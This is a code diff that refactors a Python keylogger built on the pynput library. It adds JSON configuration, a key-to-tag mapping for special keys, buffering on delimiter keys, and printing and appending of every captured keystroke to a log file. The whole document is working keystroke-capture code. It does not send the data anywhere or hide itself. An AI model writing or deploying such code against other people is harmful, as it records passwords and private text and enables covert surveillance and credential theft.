@@ -1,53 +1,74 @@
-import pynput 
-import os 
+import json
+from pathlib import Path
+import pynput
+
+SCRIPT_DIR = Path(__file__).parent.resolve()
+CONFIG_PATH = SCRIPT_DIR / "config.json"
+
+with open(CONFIG_PATH, "r") as config_file:
+    config = json.load(config_file)
+
+log_cfg = config["logging"]
+flush_on_delimiter = log_cfg["flush_on_delimiter"]
+new_line_per_delimiter = log_cfg["new_line_per_delimiter"]
+
+output_dir = Path(log_cfg["output_directory"]) if log_cfg["output_directory"] else SCRIPT_DIR
+log_file_path = output_dir / log_cfg["filename"]
 
 keyboard = pynput.keyboard
-script_dir = os.path.dirname(os.path.abspath(__file__))
+SpecialKey = keyboard.Key
 key_buffer = []
 
-# Configuration
-key_logs_file_path = os.path.join(script_dir, "keylog.txt")
+DELIMITER_KEYS = (SpecialKey.backspace, SpecialKey.space, SpecialKey.enter, SpecialKey.esc, SpecialKey.cmd)
 
-def combined_keys_in_list(list: list):
-    return "".join(list)
-    
-def save_in_key_log_file(combined_letter_in_list, with_whitespace=False):
-    with open(key_logs_file_path, "a") as file:
-        file.write(combined_letter_in_list)
-        if with_whitespace:
-            file.write("\n")   
+KEY_MAP = {
+    SpecialKey.space: " ",
+    SpecialKey.enter: "\n",
+    SpecialKey.backspace: " [BACKSPACE] ",
+    SpecialKey.tab: " [TAB] ",
+    SpecialKey.caps_lock: " [CAPS_LOCK] ",
+    SpecialKey.shift: " [SHIFT] ",
+    SpecialKey.shift_r: " [SHIFT] ",
+    SpecialKey.ctrl: " [CTRL] ",
+    SpecialKey.ctrl_r: " [CTRL] ",
+    SpecialKey.alt: " [ALT] ",
+    SpecialKey.alt_gr: " [ALT] ",
+    SpecialKey.delete: " [DELETE] ",
+    SpecialKey.esc: " [ESC] ",
+}
+
+def convert_key_to_str(key) -> str:
+    if key in KEY_MAP:
+        return KEY_MAP[key]
+        
+    if hasattr(key, "char") and key.char is not None:
+        return key.char
+        
+    key_name = str(key).replace("Key.", "").upper()
+    return f" [{key_name}] "
+
+def save_to_log(text_data: str):
+    print(text_data)
+    with open(log_file_path, "a") as file:
+        file.write(text_data)
 
 def on_press(key):
-    buttkey = keyboard.Key
-    with_whitespace = True
-
-    if hasattr(key, 'char') and key.char:
-        key_str = key.char
-    else:
-        key_str = str(key)
-
-    if key in (buttkey.backspace, buttkey.space, buttkey.enter, buttkey.esc, buttkey.cmd):
-        if key == buttkey.space:
-            key_str = " "
-            with_whitespace = False
-        elif key == buttkey.backspace:
-            key_str = " /(backspace)"
-        elif key == buttkey.enter:
-            key_str = " /(enter)"
-        key_buffer.append(key_str)
-        result = combined_keys_in_list(key_buffer)
-        save_in_key_log_file(result, with_whitespace)
-        key_buffer.clear()
-    else:
-        key_buffer.append(key_str)
+    global key_buffer
     
-def on_release(key):
-    pass
+    key_str = convert_key_to_str(key)
+    key_buffer.append(key_str)
 
-listener = keyboard.Listener(
-    on_press=on_press,
-    on_release=on_release
-)
+    if flush_on_delimiter and (key not in DELIMITER_KEYS):
+        return  
 
-listener.start()
-input("")
+    if new_line_per_delimiter:
+        key_buffer.append("\n")
+        
+    log_payload = "".join(key_buffer)
+    save_to_log(log_payload)
+
+    if new_line_per_delimiter or not flush_on_delimiter:
+        key_buffer.clear()
+
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
